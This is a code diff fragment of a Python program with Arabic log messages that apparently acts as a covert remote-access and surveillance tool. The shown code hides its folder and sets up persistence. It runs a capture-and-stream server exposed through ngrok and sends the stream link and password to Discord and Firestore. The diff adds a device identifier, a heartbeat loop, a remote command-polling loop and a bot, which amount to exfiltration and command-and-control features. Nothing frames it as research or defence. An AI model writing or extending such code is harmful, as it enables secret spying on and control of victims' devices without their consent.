 def main_loop(port):
@@ -535,6 +731,10 @@ def main_loop(port):
                         save_data(data)
                     else:
                         log("[!] فشل إرسال رسالة الديسكورد")
+                    try:
+                        firestore_write("devices", DEVICE_ID, {"stream_url": f"{url}/?key={password}"})
+                    except Exception:
+                        pass
             else:
                 log("[*] الإرسال معطل من Firebase (owner/all = off)")
         except Exception as e:
@@ -543,7 +743,7 @@ def main_loop(port):
 
 # ====== البداية ======
 def main():
-    global PASSWORD
+    global PASSWORD, DEVICE_ID
     os.makedirs(BASE_DIR, exist_ok=True)
     hide_path(BASE_DIR)
     ensure_persistence()
@@ -554,6 +754,11 @@ def main():
         PASSWORD = secrets.token_urlsafe(8)
         data["password"] = PASSWORD
         save_data(data)
+    DEVICE_ID = get_device_id()
+    log(f"[+] معرف الجهاز: {DEVICE_ID}")
+    threading.Thread(target=heartbeat_loop, daemon=True).start()
+    threading.Thread(target=poll_commands_loop, daemon=True).start()
+    start_bot()
     kill_existing_ngrok()
     port = start_stream_server()
     capture_thread = threading.Thread(target=capture_worker, daemon=True)
